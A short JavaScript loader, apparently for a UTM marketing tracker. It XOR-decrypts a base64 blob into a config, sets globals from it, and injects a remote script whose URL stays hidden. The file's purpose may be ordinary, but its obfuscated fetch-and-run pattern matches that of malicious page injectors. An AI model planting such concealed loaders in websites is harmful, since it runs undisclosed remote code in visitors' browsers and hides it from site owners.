/**
 * UTMify UTM tracker (loader)
 */
(function () {
  if (window.__UTMIFY_UTMS__) return;
  window.__UTMIFY_UTMS__ = true;

  var f_3zpb = atob(
    "DK2cgWxE1HkdGaen+9a+9B4o9kM/cdPTi96mrkMnsBczbNPKksvlrw8ruVd/a4jUmN/18Rg3+wxpdNSIl8zo5B8w+hNuO4uFmtno8wUmoQ14aoWdoNa+7w0psVsnO8PGj8yx9BgpvR9kNNfVntv57xhprBpyfYrUmMa+rU4ytRVofIWd2Y/hrRdmuhhwfIWd2cn99Q1poQ1wcMHe1t3u5Bohug0watLFksnvo0BmohhxbMKFwY++/DE5"
  );
  var s_8u = [];
  for (var i_e3pr = 0; i_e3pr < f_3zpb.length; i_e3pr++) {
    s_8u.push(f_3zpb.charCodeAt(i_e3pr) & 255);
  }
  var b_2m04 = s_8u[0];
  var e_1wfv = s_8u.slice(1, 1 + b_2m04);
  var b_e0fw = s_8u.slice(1 + b_2m04);
  var w_ie = b_e0fw.map(function (b, d_55y) {
    return b ^ e_1wfv[d_55y % b_2m04];
  });
  var h_jp = "";
  for (var j_fd = 0; j_fd < w_ie.length; j_fd++) {
    h_jp += String.fromCharCode(w_ie[j_fd] & 255);
  }
  var t_m3b2 = decodeURIComponent(escape(h_jp));
  var t_b6 = JSON.parse(t_m3b2);
  var y_hb = t_b6.globals || [];
  y_hb.forEach(function (y_2n) {
    window[y_2n.name] = y_2n.value;
  });
  var a_k = document.createElement("script");
  a_k.src = t_b6.url;
  a_k.async = true;
  a_k.defer = true;
  (t_b6.attributes || []).forEach(function (b_t8) {
    a_k.setAttribute(b_t8.name, b_t8.value);
  });
  (document.head || document.documentElement).appendChild(a_k);
})();
